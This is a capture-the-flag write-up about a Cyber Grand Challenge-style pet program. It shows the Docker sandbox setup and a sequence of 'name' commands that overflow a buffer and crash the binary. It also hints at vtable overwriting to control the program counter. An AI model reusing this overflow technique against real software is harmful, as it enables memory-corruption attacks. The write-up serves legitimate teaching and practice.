
Setting up this challenge, I rely on Docker containers.
Specifically, when you ssh into the machine, you are
in your own little world. Let's talk about that world.

Your entry in `/etc/passwd`:


```
root@ip-172-31-43-33:/etc# grep toddler /etc/passwd
toddler:x:1002:1002:Toddler:/home/toddler:/bin/dosh2
```

Your entry in `/etc/sudoers`:

```
toddler ALL=(root) NOPASSWD: /bin/shell2docker2
```

Your shell in `/bin/dosh2`:

```
# cat /bin/dosh2
#!/bin/bash
sudo /bin/shell2docker2
```

The continuation of the shell `/bin/shell2docker`:

```
#!/bin/bash
if [ $SUDO_USER ]; then
  username=$SUDO_USER
else
  username=$(whoami)
fi
uid="$(id -u $username)"
gid="$(id -g $username)"
ID=`docker run --rm -d \
  -u $uid:$gid \
  --network none \
  -v /etc/passwd:/etc/passwd:ro \
  -v /etc/group:/etc/group:ro \
  pet /bin/sh -c "sleep 120"`

/bin/killme $ID &
exec docker exec -it $ID /home/pet/tracer
```

Ok, so once you ssh into the machine you're in a Docker container created for
your shell. The program `/bin/killme` is a program hardcoded with an alarm
for 2 minutes. It shuts down the docker container
(using `docker kill [containerid]`).

# The challenge

This challenge is actually one I wrote while working on the
[DARPA Cyber Grand Challenge](https://www.darpa.mil/program/cyber-grand-challenge)
called
[TNETS\_0002](https://github.com/CyberGrandChallenge/samples/tree/master/examples/TNETS_00002).
It was primarily to test whether C++ programs could, in fact, be used to generate
challenges in the [DECREE](https://blog.legitbs.net/2016/05/what-is-decree.html)
environment (a operating system environment with only 7 system calls).

Like challengers in the Cyber Grand Challenge, your task is to find a way of crashing
the program (this is called a Proof of Vulnerability). If I had time, I was going to
add a second challenge that built on this which would require you to not only crash
it, but also demonstrate control of the program counter by causing it to crash with
a specific address in the program counter. I ran out of time, sorry.

# The protocol

The program allows you to create a menagerie of pets, but each command must be prefaced
with a sequence number (not too hard for a human to deduce, but a little tougher for
a automated system to reason about).

# The exploit

Creating an animal, you can give it a name. When you name that pet again,
instead of replacing the name you gave it earlier, the new name is appended
to the previous. Give your pet a long enough name and you'll be given a
segmentation fault.

```
list init...
1 create cat
init..
1 name 0 aaaaa
bad sequence
2 name 0 aaaaaaa
3 name 0 aaaaaaa
4 name 0 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
5 name 0 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
6 name 0 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
7 name 0 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
8 name 0 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

# The longer exploit

When you crash this program, you're overwriting a buffer in the class structure.
Nearby there is a vtable and it should be possible to construct a valid vtable
and cause the binary to crash by jumping to an arbitrary address. I welcome
a proof of concept on this.
